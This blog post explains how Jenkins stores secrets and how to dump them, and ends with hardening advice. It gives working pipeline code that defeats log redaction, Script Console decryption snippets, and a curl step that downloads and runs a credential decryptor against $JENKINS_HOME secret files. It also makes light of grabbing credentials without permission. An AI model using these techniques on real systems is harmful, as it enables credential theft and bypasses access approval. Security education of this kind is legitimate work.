---
author: Andrzej Rehmann
layout: post
asset-type: post
title: "Accessing and dumping Jenkins credentials"
date: 2019-05-30 08:00:00
description: "Accessing and dumping Jenkins credentials"
abstract: "Creating, accessing, and dumping Jenkins credentials."
image: 
    src: /assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/jenkins-credentials-banner-low-res.jpg
    attribution:
       text: Photo by Stefan Steinbauer on Unsplash
       href: https://unsplash.com/photos/HK8IoD-5zpg?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText
tags: 
- devops
- Jenkins
- Continuous Integration
---

Most pipelines require secrets to authenticate with some external resources.  
All secrets should live outside of our code repository and should be fed directly into the pipeline.   
Jenkins offers a credentials store where we can keep our secrets and access them in a couple of different ways.

## Why dump credentials

> Jenkins is an easy pick when it comes to intelligence gathering.

To provide the best service as consultants, we often need all the information the client can give us.  
Usually, the client provides us full access to the codebase and the infrastructure.

Sometimes, however, the things we would like to check are, let's say, temporarily out of our reach.
We, of course, can request permission for access, but it can take quite a while.
It could also be the case where nobody knows how to access the resource.

We can speed up things a little bit by poking around in Jenkinses and finding the way in ourselves.
If we've been granted full access on paper, then there is no ethical dilemma here.

> To make a good first impression ask Jenkins for a confession.

By requesting access, we could be delayed by questions like "why do you need that?" or "I will have to talk with my supervisor first."  
There is no need for that; we already have the approvals. 
We are the Consultants.   

But seriously.  

Giving access to a Jenkins equals a license to view all secrets stored there.  
If you don't want people to poke around, don't give them ANY access to your CI.

> The answers you seek, Jenkins shall leak.

Sometimes we encounter entities which are, let's say, reluctant to share.  
It could be many different reasons. However, we don't judge; stuff happens, deadlines must be met, we understand. 
All we need is to have a full picture of the situation.

> We don't know them; they don't know us; however, Jenkins doesn't choose sides.

What do you do when you join a project and the person with the vital knowledge has long left, and nobody knows how to access that windows 98 machine in production?  
Jenkins knows.  
Now you know.  
Be the hero.

> Encryption, decryption, Jenkins provides plain text subscription.

Even if you don't need to stealthily obtain the credentials from your own company it is still good to know about the vulnerabilities when using Jenkins.

## Credentials storage

I did not use the word “secure” anywhere in the introduction because the way any CI server stores credentials, are by nature, insecure.

CI servers cannot use one-way hashes (like bcrypt) to encode secrets because when requested by the pipeline, those secrets need to be restored into their original form.  
One-way hashes are then out of the picture, what's left is two-way encryption.
This means two things:

1. Jenkins encrypts secrets at rest but keeps the decryption key somewhere on its host.
2. Anyone who can create jobs on Jenkins can view all secrets in plain text.

You may be wondering why Jenkins even bother encrypting the secrets if they can be retrieved in their pure form just by asking. I don't have a good answer for that.

However, using Jenkins credentials store is infinitely better than keeping secrets in the project repository.
Later in this post, I will talk about what can be done to minimize the leakage of secrets from Jenkins.


---


## Creating credentials

If you want to follow this post and run the examples yourself, you can spin up a pre-configured Jenkins instance from my [jenkinsfile-examples][0] repository in less then a minute (depending on your internet bandwidth):

```bash
git clone https://github.com/hoto/jenkinsfile-examples.git
docker-compose pull
docker-compose up
```

Open `localhost:8080`, where you should see a Jenkins with a couple of jobs.

To browse and add secrets, click on `Credentials`.  
My Jenkins instance already has some pre-made credentials created by me.

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/001.png)

To add secrets hover over `(global)` to show a ▼ sign and click on it.  
Select `Add credentials` where you can finally add secrets.

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/002.png)

If you want, you can add more secrets, but I will be using the existing secrets.

> My advice is to provide a meaningful `ID` and use the same value for `Description`.  
> `user` is not a good `ID`, `github-rw-user` is better.

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/003.png)

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/004.png)

Now that we've covered creating credentials, let's move on to accessing them from a `Jenkinsfile`.

## Accessing credentials from a Jenkinsfile

We will be running job `130-accessing-credentials`. 

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/005.png)

Job `130-accessing-credentials` has a following [Jenkinsfile][1]:

```groovy
pipeline {
  agent any
  stages {

    stage('usernamePassword') {
      steps {
        script {
          withCredentials([
            usernamePassword(credentialsId: 'gitlab',
              usernameVariable: 'username',
              passwordVariable: 'password')
          ]) {
            print 'username=' + username + 'password=' + password

            print 'username.collect { it }=' + username.collect { it }
            print 'password.collect { it }=' + password.collect { it }
          }
        }
      }
    }

    stage('usernameColonPassword') {
      steps {
        script {
          withCredentials([
            usernameColonPassword(
              credentialsId: 'gitlab',
              variable: 'userpass')
          ]) {
            print 'userpass=' + userpass
            print 'userpass.collect { it }=' + userpass.collect { it }
          }
        }
      }
    }

    stage('string (secret text)') {
      steps {
        script {
          withCredentials([
            string(
              credentialsId: 'joke-of-the-day',
              variable: 'joke')
          ]) {
            print 'joke=' + joke
            print 'joke.collect { it }=' + joke.collect { it }
          }
        }
      }
    }

    stage('sshUserPrivateKey') {
      steps {
        script {
          withCredentials([
            sshUserPrivateKey(
              credentialsId: 'production-bastion',
              keyFileVariable: 'keyFile',
              passphraseVariable: 'passphrase',
              usernameVariable: 'username')
          ]) {
            print 'keyFile=' + keyFile
            print 'passphrase=' + passphrase
            print 'username=' + username
            print 'keyFile.collect { it }=' + keyFile.collect { it }
            print 'passphrase.collect { it }=' + passphrase.collect { it }
            print 'username.collect { it }=' + username.collect { it }
            print 'keyFileContent=' + readFile(keyFile)
          }
        }
      }
    }

    stage('dockerCert') {
      steps {
        script {
          withCredentials([
            dockerCert(
              credentialsId: 'production-docker-ee-certificate',
              variable: 'DOCKER_CERT_PATH')
          ]) {
            print 'DOCKER_CERT_PATH=' + DOCKER_CERT_PATH
            print 'DOCKER_CERT_PATH.collect { it }=' + DOCKER_CERT_PATH.collect { it }
            print 'DOCKER_CERT_PATH/ca.pem=' + readFile("$DOCKER_CERT_PATH/ca.pem")
            print 'DOCKER_CERT_PATH/cert.pem=' + readFile("$DOCKER_CERT_PATH/cert.pem")
            print 'DOCKER_CERT_PATH/key.pem=' + readFile("$DOCKER_CERT_PATH/key.pem")
          }
        }
      }
    }

    stage('list credentials ids') {
      steps {
        script {
          sh 'cat $JENKINS_HOME/credentials.xml | grep "<id>"'
        }
      }
    }

  }
}
```

All examples for different types of secrets can be found in the official Jenkins [documentation][2].

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/006.png)

Running the job and checking the logs uncovers that Jenkins tries to redact the secrets from the build log by looking for secrets values and replacing them with stars `****`.  
We can see the actual secret values if we print them in such a way that a simple match-and-replace won't work.  
This way, each character is printed separately, and Jenkins does not redact the values.

Example code:

```groovy
print 'username.collect { it }=' + username.collect { it }
```

Log output:

```
username.collect { it }=[g, i, t, l, a, b, a, d, m, i, n]
```

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/007.png)

> Anyone with write access to a repository built on Jenkins can uncover all `Global` credentials by modifying a `Jenkinsfile` in that repository.

> Anyone who can create jobs on Jenkins can uncover all `Global` secrets by creating a pipeline job.

### Listing ids of secrets

Before you ask Jenkins for a credential you need to know its id.  
You can list all credentials ids by reading the `$JENKINS_HOME/credentials.xml` file.

Code:

```groovy
stage('list credentials ids') {
  steps {
    script {
      sh 'cat $JENKINS_HOME/credentials.xml | grep "<id>"'
    }
  }
}
```

Log output:

``` 
<id>gitlab</id>
<id>production-bastion</id>
<id>joke-of-the-day</id>
<id>production-docker-ee-certificate</id>
```

---


## Accessing `System` and other credential values from the UI 

Jenkins has two types of credentials: `System` and `Global`.

> `System` credentials are accessible only from Jenkins configuration (e.g., plugins).

> `Global` credentials are the same as `System` but are also accessible from Jenkins jobs.

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/008.png)

### Grabbing credentials using a browser inspection tool

By definition `System` credentials are not accessible from jobs, but we can decrypt them from the Jenkins UI.  
To do so you need admin privileges. 

> Jenkins sends the encrypted value of each secret to the UI.  
> This is a huge security flaw.

To grab encrypted secret:
 
1. Navigate to `http://localhost:8080/credentials/` 
2. Update any of the credentials.
3. Open dev console (F12 in Chrome).
4. Inspect the dotted element.
5. Copy text value of `value`

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/009.png)

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/010.png)

In my case the encrypted secret is `{AQAAABAAAAAgPT7JbBVgyWiivobt0CJEduLyP0lB3uyTj+D5WBvVk6jyG6BQFPYGN4Z3VJN2JLDm}`.

To decrypt any credentials we can use Jenkins console which requires admin privileges to access.  

> If you don't have admin privileges, try to elevate your permissions by looking for an admin user in `Global` credentials first.

To open `Script Console` navigate to `http://localhost:8080/script`.

Tell jenkins to decrypt and print out the secret value:

```groovy
println hudson.util.Secret.decrypt("{AQAAABAAAAAgPT7JbBVgyWiivobt0CJEduLyP0lB3uyTj+D5WBvVk6jyG6BQFPYGN4Z3VJN2JLDm}")
```

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/011.png)

There you have it; now you can decrypt any Jenkins secret (if you have admin privileges).

Side note: if you try to run this code from a Jenkinsfile job, you will get an error message:

```
Scripts not permitted to use staticMethod hudson.util.Secret decrypt java.lang.String. 
Administrators can decide whether to approve or reject this signature.
```

Although most credentials are stored in `http://localhost:8080/credentials/` view, you can find additional secrets in:  

1. `http://localhost:8080/configure` - some plugins create password type fields in this view

2. `http://localhost:8080/configureSecurity/` - look for stuff like AD credentials

### Iterate and decrypt credentials from the console

Another way is to list all credentials then decrypt them from the console:

```groovy
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
)

for(c in creds) {
  if(c instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey){
    println(String.format("id=%s  desc=%s key=%s\n", c.id, c.description, c.privateKeySource.getPrivateKeys()))
  }
  if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl){
    println(String.format("id=%s  desc=%s user=%s pass=%s\n", c.id, c.description, c.username, c.password))
  }
}
```

Output:

```
id=gitlab  desc=gitlabadmin user=gitlabadmin pass=Drmhze6EPcv0fN_81Bj
id=production-bastion  desc=production-bastion key=[-----BEGIN RSA PRIVATE KEY...
```

This script is not finished though. You can look up all the credential class names in the Jenkins source code.


---


## How Jenkins stores credentials

To access and decrypt Jenkins credentials you need three files.  

* `credentials.xml` - holds encrypted credentials
* `hudson.util.Secret` - decrypts `credentials.xml` entries, this file is itself encrypted
* `master.key` - decrypts `hudson.util.Secret`

All three files are located inside Jenkins home directory:

    $JENKINS_HOME/credentials.xml 
    $JENKINS_HOME/secrets/master.key
    $JENKINS_HOME/secrets/hudson.util.Secret

Because Jenkins is open source, someone already reverse engineered the encryption and decryption procedure.
If you are interested in the details then read this fascinating [blog][3].

Secrets are encrypted in `credentials.xml` using `AES-128` with `hudson.util.Secret` as the key, then are `base64` encoded.  
`hudson.util.Secret` binary file is encrypted with `master.key`.  
`master.key` is stored in plain text.

> `credentials.xml` stores both `Global` and `System` credentials.  
> To directly access and decrypt that file you do NOT need admin privileges.

## Decrypting and dumping credentials

There are existing tools to decrypt Jenkins secrets.
The ones I found are in python, like this [one][4].  
I would include the source code here, but unfortunately, that repository does not have a license.

Python cryptography module is not included in the python standard library, it has to be installed as a dependency.
Because I don't want to deal with python runtime and external dependencies I wrote my [own][5] decryptor in Go.  
Go binaries are self-contained and require only the kernel to run.

Side note: Jenkins is using `AES-128-ECB` algorithm which is not included in the Go standard library.
That algorithm was deliberately excluded in 2009 to discourage people from using it.

Github repository for my `jenkins-credentials-decryptor` tool can be found [here][5].  
To see the binary in action run job `131-dumping-credentials`, which uses the following Jenkinsfile:

```groovy
pipeline {
  agent any
  stages {

    stage('Dump credentials') {
      steps {
        script {
           sh '''
             curl -L \
               "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/0.0.5-alpha/jenkins-credentials-decryptor_0.0.5-alpha_$(uname -s)_$(uname -m)" \
                -o jenkins-credentials-decryptor

             chmod +x jenkins-credentials-decryptor
             
             ./jenkins-credentials-decryptor \
               -m $JENKINS_HOME/secrets/master.key \
               -s $JENKINS_HOME/secrets/hudson.util.Secret \
               -c $JENKINS_HOME/credentials.xml 
           '''
        }
      }
    }

  }
}
```

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/012.png)

![]({{site.baseurl}}/assets/custom/img/blog/2019-05-30-accessing-and-dumping-jenkins-credentials/013.png)

This tool can also be run on the Jenkins host via ssh. It's only ~6MB and will work on any linux distribution.

> By decrypting `credentials.xml` with `jenkins-credentials-decryptor`, we can print the values of both `Global` and `System` credentials without the admin privileges.

---

## Prevention and best practices

I don’t think there is a way to completely mitigate security vulnerabilities when using a CI.  
We can only make it a bit more time consuming to let the attacker get our secrets by setting up layers and create a moving target.

### 1. Hide Jenkins behind a VPN

This is an easy pick and my #1 advice to anyone using a Jenkins.

Prevent most basic attacks by hiding your Jenkins from the public internet.  
I know VPNs are annoying, but nowadays the internet connection is so fast and responsive you should not even notice.

### 2. Regularly update Jenkins

Often Jenkinses are left for months and even years without an update.
Old versions are full of known holes and vulnerabilities.
Same for plugins and the OS, don't hesitate to update them as well.
If you are worried about updating, then set up an automatic backup of the Jenkins disk every 24h.

### 3. Follow the principle of least privilege 

If read-only access is enough, then don't use credentials with read-and-write access.

### 4. Limit the access scope

When a pipeline only needs access to a subset of resources, then create credentials only for those resources and nothing more.

### 5. Avoid using secrets when possible

Secrets won't leak if we never create them in the first place.  
Some cloud providers make it possible to access a resource by assigning a role to a machine (e.g., AWS IAM role).

### 6. Create a moving target

Instead of storing a secret on Jenkins store it in a vault with automatic password rotation (e.g., Hashicorp Vault, AWS Secrets Manager).
Make your pipeline call a vault to access a secret every time it needs it. 
This makes automatic password rotation very easy to set up as the vault will be the only source of truth.

Although a password rotation does not prevent the secret to leak, the secret value will only be valid for a limited time.  
That's why we call it "creating a moving target."

### 7. Treat all credentials stored in Jenkins as plain text

Treat everyone with access to Jenkins as an admin user, and you will be fine.  
Once you give someone access, even read-only, to a Jenkins it's game over.  
All developers on a project should know all secrets anyway.

### 8. Expect that you will get hacked

If you have something worth stealing, someone will try to steal it.

You may think that if someone stole your source code and dumped your databases, it's game over, but that is not necessarily true.
For example if your production database is dumped but the customers' secrets inside it are properly one-way hashed then the damage can be vastly reduced.
The only thing your company looses in such scenario is its credibility.



[0]: https://github.com/hoto/jenkinsfile-examples
[1]: https://github.com/hoto/jenkinsfile-examples/blob/master/jenkinsfiles/130-accessing-credentials.groovy
[2]: https://jenkins.io/doc/pipeline/steps/credentials-binding/
[3]: http://xn--thibaud-dya.fr/jenkins_credentials.html
[4]: https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py
[5]: https://github.com/hoto/jenkins-credentials-decryptor

